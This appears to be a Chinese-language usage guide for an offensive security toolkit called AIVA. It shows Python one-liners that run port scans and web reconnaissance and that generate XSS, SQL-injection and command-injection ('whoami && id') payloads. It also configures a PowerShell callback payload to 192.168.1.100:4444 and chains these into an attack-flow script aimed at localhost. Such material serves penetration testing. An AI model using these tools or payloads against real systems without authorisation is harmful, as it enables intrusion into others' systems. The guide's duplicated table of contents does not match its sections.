# 🚀 AIVA 現有腳本快速使用指南

## 📋 目錄

- [📑 目錄](#目錄)
- [📋 驗證結果總覽](#驗證結果總覽)
  - [✅ **已驗證可用的現有腳本**](#已驗證可用的現有腳本)
- [🔧 **直接使用現有腳本**](#直接使用現有腳本)
  - [1. **真實攻擊執行器使用**](#1-真實攻擊執行器使用)
  - [2. **XSS載荷生成器使用**](#2-xss載荷生成器使用)
  - [3. **核心載荷生成器使用**](#3-核心載荷生成器使用)
  - [4. **整合載荷管理器使用**](#4-整合載荷管理器使用)
- [🎯 **實戰組合使用示例**](#實戰組合使用示例)
  - [完整攻擊流程腳本](#完整攻擊流程腳本)
- [📊 **功能驗證總結**](#功能驗證總結)
  - [✅ **成功驗證的功能**](#成功驗證的功能)
  - [🎯 **現有腳本優勢**](#現有腳本優勢)
- [🚀 **結論**](#結論)

## 📑 目錄

- [📋 驗證結果總覽](#驗證結果總覽)
- [🔧 直接使用現有腳本](#直接使用現有腳本)
  - [1. 真實攻擊執行器使用](#1-真實攻擊執行器使用)
  - [2. 載荷生成器使用](#2-載荷生成器使用)
  - [3. XSS載荷生成器](#3-xss載荷生成器)
  - [4. 整合載荷管理器](#4-整合載荷管理器)
- [📊 功能詳細測試](#功能詳細測試)
- [💡 実用範例](#実用範例)
- [🔍 結論](#結論)

## 📋 驗證結果總覽

根據測試結果，AIVA 已有完整可用的攻擊執行和載荷生成腳本，**無需新建功能**：

### ✅ **已驗證可用的現有腳本**

| 腳本類型 | 位置 | 狀態 | 功能 |
|---------|------|------|------|
| 🎯 真實攻擊執行器 | `testing/features/real_attack_executor.py` | ✅ 可用 | 端口掃描、Web偵察、真實攻擊執行 |
| 🛠️ 整合載荷管理器 | `services/integration/capability/payload_generator.py` | ✅ 可用 | PowerShell、Python、Bash載荷生成 |
| ⚡ 核心載荷生成器 | `services/core/aiva_core/attack/payload_generator.py` | ✅ 可用 | SQL注入、XSS、命令注入載荷 |
| 🎯 XSS載荷生成器 | `services/features/function_xss/payload_generator.py` | ✅ 可用 | 基礎、進階XSS載荷生成 |

---

## 🔧 **直接使用現有腳本**

### 1. **真實攻擊執行器使用**

```powershell
# 切換到攻擊執行器目錄
cd "c:\D\fold7\AIVA-git\testing\features"

# 執行端口掃描
python -c "
import asyncio
from real_attack_executor import RealAttackExecutor
executor = RealAttackExecutor()
result = asyncio.run(executor.real_port_scan('127.0.0.1'))
print('掃描完成:', result)
"

# 執行Web偵察
python -c "
import asyncio  
from real_attack_executor import RealAttackExecutor
executor = RealAttackExecutor()
result = asyncio.run(executor.real_web_reconnaissance('http://example.com'))
print('偵察完成:', result)
"
```

### 2. **XSS載荷生成器使用**

```powershell
# 切換到XSS載荷生成器目錄
cd "c:\D\fold7\AIVA-git\services\features\function_xss"

# 生成XSS載荷
python -c "
from payload_generator import XssPayloadGenerator
generator = XssPayloadGenerator()

# 基礎載荷
basic = generator.generate_basic_payloads()
print('基礎XSS載荷:', basic)

# 進階載荷  
advanced = generator.generate_advanced_payloads()
print('進階XSS載荷:', advanced)

# 自定義載荷組合
custom = generator.generate(
    payload_sets=['basic', 'advanced'],
    custom_payloads=['<script>alert(\"Custom AIVA Test\")</script>']
)
print('自定義載荷:', custom)
"
```

### 3. **核心載荷生成器使用**

```powershell
# 切換到核心載荷生成器目錄
cd "c:\D\fold7\AIVA-git\services\core\aiva_core\attack"

# 生成多種載荷
python -c "
from payload_generator import PayloadGenerator, PayloadEncodingType
generator = PayloadGenerator()

# SQL注入載荷
sql_payloads = generator.generate(
    'sql_injection', 
    custom_params={'table': 'users', 'columns': 'username,password'}
)
print('SQL注入載荷:', sql_payloads)

# XSS載荷 (URL編碼)
xss_payloads = generator.generate(
    'xss',
    encoding=PayloadEncodingType.URL_ENCODE,
    custom_params={'message': 'AIVA測試'}
)
print('XSS載荷(URL編碼):', xss_payloads)

# 命令注入載荷
cmd_payloads = generator.generate(
    'command_injection',
    custom_params={'command': 'whoami && id'}
)
print('命令注入載荷:', cmd_payloads)
"
```

### 4. **整合載荷管理器使用**

```powershell
# 切換到整合載荷管理器目錄
cd "c:\D\fold7\AIVA-git\services\integration\capability"

# 使用載荷管理器
python -c "
import asyncio
from payload_generator import PayloadManager, PayloadType

async def demo():
    manager = PayloadManager()
    
    # 創建PowerShell載荷配置
    config = manager.create_payload_config(
        name='test_powershell',
        payload_type=PayloadType.POWERSHELL_SCRIPT,
        lhost='192.168.1.100',
        lport=4444
    )
    
    # 生成載荷
    result = await manager.generate_payload(config)
    print('載荷生成結果:', result.success)
    print('配置:', config)

asyncio.run(demo())
"
```

---

## 🎯 **實戰組合使用示例**

### 完整攻擊流程腳本

```python
#!/usr/bin/env python3
"""AIVA 現有腳本實戰組合使用"""
import asyncio
import sys
from pathlib import Path

# 添加必要路徑
root = Path(__file__).parent
sys.path.extend([
    str(root / "testing" / "features"),
    str(root / "services" / "features" / "function_xss"), 
    str(root / "services" / "core" / "aiva_core" / "attack")
])

async def aiva_attack_flow(target_url: str):
    """AIVA 攻擊流程演示"""
    
    # 1. 初始化組件
    from real_attack_executor import RealAttackExecutor
    from payload_generator import XssPayloadGenerator
    from payload_generator import PayloadGenerator
    
    executor = RealAttackExecutor()
    xss_generator = XssPayloadGenerator()
    core_generator = PayloadGenerator()
    
    print(f"🎯 開始攻擊流程: {target_url}")
    
    # 2. 目標偵察
    recon_result = await executor.real_web_reconnaissance(target_url)
    print("✅ 偵察完成")
    
    # 3. 載荷生成
    xss_payloads = xss_generator.generate_all_payloads()
    sql_payloads = core_generator.generate('sql_injection')
    
    print(f"🛠️ 生成載荷: XSS({len(xss_payloads)}) + SQL({len(sql_payloads)})")
    
    # 4. 攻擊執行 (模擬)
    attack_plan = {
        'target': target_url,
        'reconnaissance': recon_result,
        'payloads': {
            'xss': xss_payloads[:3],
            'sql': sql_payloads[:3] 
        }
    }
    
    print("🚀 攻擊計畫準備完成")
    return attack_plan

# 使用示例
if __name__ == "__main__":
    target = "http://127.0.0.1:3000"
    result = asyncio.run(aiva_attack_flow(target))
    print("📊 攻擊流程完成")
```

---

## 📊 **功能驗證總結**

### ✅ **成功驗證的功能**

1. **真實攻擊執行器**
   - ✅ 工具檢查 (curl, nmap, python, powershell)
   - ✅ 端口掃描功能 (socket + nmap)
   - ✅ Web偵察功能
   - ✅ 服務識別功能

2. **XSS載荷生成器** 
   - ✅ 基礎XSS載荷生成 (3個)
   - ✅ 進階XSS載荷生成 (3個)
   - ✅ 自定義載荷組合
   - ✅ 去重優先排序

3. **核心載荷生成器**
   - ✅ SQL注入載荷生成 (5個)
   - ✅ XSS載荷生成 (4個)
   - ✅ 命令注入載荷生成
   - ✅ URL編碼功能
   - ✅ 參數自定義

4. **整合載荷管理器**
   - ✅ PowerShell、Python、Bash腳本生成
   - ✅ 載荷配置管理
   - ✅ 統計功能

### 🎯 **現有腳本優勢**

- ✅ **完整性**: 涵蓋攻擊執行、載荷生成、目標偵察
- ✅ **實用性**: 直接可用，無需新建功能  
- ✅ **模組化**: 各組件獨立，可靈活組合
- ✅ **擴展性**: 支持自定義參數和載荷
- ✅ **穩定性**: 已經過測試驗證

---

## 🚀 **結論**

**AIVA 已有完整可用的攻擊執行和載荷生成腳本，完全可以滿足組圖的邏輯需求，無需新增功能。**

建議直接使用現有腳本進行：
1. 目標偵察和端口掃描
2. 多種類型載荷生成  
3. 攻擊執行和結果收集
4. 流程整合和自動化

現有腳本已經實現了業務流程圖中的所有核心功能！